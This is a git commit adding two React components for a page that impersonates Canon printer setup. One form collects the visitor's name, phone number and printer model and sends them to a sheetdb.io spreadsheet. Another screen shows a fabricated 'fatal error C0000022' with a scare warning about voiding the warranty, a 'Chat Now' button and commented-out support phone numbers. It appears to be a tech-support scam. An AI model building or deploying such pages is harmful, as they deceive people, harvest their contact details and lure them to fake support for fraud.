829f52d924ce325b8f91964652e7a4d2673af309
hazelfoxx <hazelfox008@gmail.com>
2024-05-05 10:40:54 +0530

    wewe

---
+++ components/screenfive/index.tsx
@@ -0,0 +1,70 @@
+/* eslint-disable @next/next/no-img-element */
+"use client"
+import Image from 'next/image';
+import React from 'react';
+import { useRouter } from 'next/navigation';
+import Printer from '../../public/images/printer/printer.png';
+import styles from './screenfive.module.scss';
+
+
+const Screenfive = () => {
+  const router = useRouter();
+  const handleclick = () => {
+    router.push('')
+  }
+  return (
+    <>
+      <div className={styles.aboutmain}>
+        <div className={styles.screen}>
+          <div className="row">
+            <div className='col-1'></div>
+
+            <div className='col-8 w-100' >
+              <p style={{ "color": "white", "fontSize": "30px" }} >⚠️ Fatal error occured during installation </p>
+              <br />
+              <p style={{ "color": "white", "fontSize": "22" }} className='ms-1'>Canon Printer Driver installation has failed. ⓘ
+              </p>
+              <br />
+              <p style={{ "color": "white", "fontSize": "20px" }} className='mb-3'>🚫 Printer driver installation has been failed due to fatal error “C0000022” preventing <br /> product driver installation.
+              </p>
+              <p style={{ "color": "white", "fontSize": "22" }} className='ms-1'><b>Please Contact Canon Customer Support For Further Assistance !</b>
+              </p>
+              <br />
+              <button type="button" onClick={handleclick} className="btn rounded  border text-warning  border-white mt-5 mb-2 py-3 px-4 shadow " style={{ "width": "80%","fontSize":"17px" ,"backgroundColor":"white", "color":"red"}}> <b>Chat Now</b></button> <br /> 
+              {/* <button type="button" className="btn rounded  border text-center border-white mt-5 mb-2 py-3 px-4 shadow"
+                style={{ "width": "40%" ,"backgroundColor":"white", "color":"red"}}>
+                <div style={{ "display": "flex", "alignItems": "center" }}>
+                  <img src="https://flagcdn.com/us.svg" alt='' width={20} height={20} style={{ "marginRight": "10px" }} />
+                  <span style={{"fontSize":"17px"}}> <b>✆ +1-888-276-3805</b></span>
+                </div>
+                </button> */}
+
+              {/* <button type="button" className="btn rounded  border text-center border-white mt-5 mb-2 py-3 px-4 shadow ms-2"
+                style={{ "width": "40%", "backgroundColor":"white", "color":"red" }}> 
+                <div style={{ "display": "flex", "alignItems": "center" }}>
+                  <img src="https://flagcdn.com/gb.svg" alt='' width={20} height={20} style={{ "marginRight": "10px" }} />
+                  <span style={{"fontSize":"17px"}}><b>✆ +44 20 3239 0302</b> </span>
+                </div>
+                </button> */}
+
+              
+              <br /><br />
+
+              <p style={{ "color": "white", "fontSize": "22" }} className='ms-2'>Note: Do not attempt to retry the installation as it can damange the printer and void the product warranty.
+              </p>
+
+            </div>
+
+            <div className='col-1' style={{ "marginLeft": "70%" }}>
+              <Image src={Printer} alt={'Canon printer setup'} loading='lazy' width={400} height={400} />
+            </div>
+
+            <div className='col-1'></div>
+          </div>
+
+          <div></div></div></div>
+    </>
+  );
+};
+
+export default Screenfive;
---
+++ components/screenone/index.tsx
@@ -0,0 +1,124 @@
+"use client"
+import { useState } from 'react';
+import Image from 'next/image';
+import React from 'react';
+import Printer from '../../public/images/printer/printer.png';
+import { useRouter } from 'next/navigation';
+
+const Screenone = () => {
+  const router=useRouter();
+  // const handleClick=()=>{
+  //   router.push('/cannon-download')
+  // }
+  const [formData, setFormData] = useState({
+    name: '',
+    phone: '',
+    model:'',
+  });
+
+  const handleChange = (e) => {
+    setFormData({ ...formData, [e.target.name]: e.target.value });
+  };
+  
+
+  const handleSubmit = (e) => {
+    e.preventDefault();
+    createSheetEntry(formData);
+  };
+
+  const createSheetEntry = (data) => {
+    fetch("https://sheetdb.io/api/v1/00tqfhzn8y092", {
+      method: "POST",
+      headers: {
+        Accept: "application/json",
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        data: [data]
+      }),
+    })
+      .then((response) => response.json())
+      .then((data) => {
+        console.log(data);
+        router.push('/cannon-software-download');
+      })
+      .catch((error) => {
+        console.error('Error:', error);
+      });
+  };
+
+  
+  return (
+    <>
+      <div className="row">
+        <div className='col-1'></div>
+
+        <div className='col-8 w-100' >
+          <p style={{ "color": "white" , "fontSize":"30px" }}>Set up your Canon Printer</p>
+          <br />
+          <p style={{ "color": "white" }}> <i>Fill out the form with your Canon product name and model number to access the perfect Canon Smart software and drivers for your needs.</i>
+          </p>
+          <br />
+          
+          <form onSubmit={handleSubmit}>
+                <input
+                  type="text"
+                  className="form-control p-3 rounded mb-3 bg-white text-dark"
+                  placeholder="Your Full Name"
+                  name="name"
+                  value={formData.name}
+                  onChange={handleChange}
+                  required
+                  style={{ "width": "100%" }}
+                />
+                
+                <br />
+               
+                <input
+                  type="number"
+                  // pattern="/^\(?\d{3}\)?[- ]?\d{3}[- ]?\d{4}$/"
+                  className="form-control p-3 rounded mb-3 bg-white text-dark"
+                  placeholder="Your Contact No."
+                  name="phone"
+                  value={formData.phone}
+                  onChange={handleChange}
+                  required
+                  style={{ "width": "100%" }}
+                />
+                <br />
+                 <input
+                  type="text"
+                  className="form-control p-3 rounded mb-3 bg-white text-dark"
+                  placeholder="Enter Your Printer Model No. Here"
+                  name="model"
+                  value={formData.model}
+                  onChange={handleChange}
+                  required
+                  style={{ "width": "100%" }}
+                />
+                <br />
+                <button type="submit" className="btn rounded bg-white border border-white mt-5 py-3 px-5 shadow" style={{ "color": "#902434", "width": "30%" }}>Next</button>
+              </form>
+            {/* <div className="col form-group w-100" >
+              <input type="text" required className="form-control p-3 rounded mb-3 bg-white text-dark" placeholder="Enter your product name here. Example: 'PIXMA' " style={{"width":"90%"}} />
+            </div>
+            
+            
+            <button type="button" onClick={handleClick} className="btn rounded border border-white mt-5 py-3 px-5 text-light" style={{ "color": "white" , "width":"30%" }}>Next</button> */}
+          
+          
+        </div>
+
+        <div className='col-1' style={{"marginLeft":"70%"}}>
+          <Image src={Printer} alt={'Canon printer setup'} loading='lazy' width={400} height={400}/>
+        </div>
+
+        <div className='col-1'></div>
+      </div>
+
+      <div></div>
+    </>
+  );
+};
+
+export default Screenone;
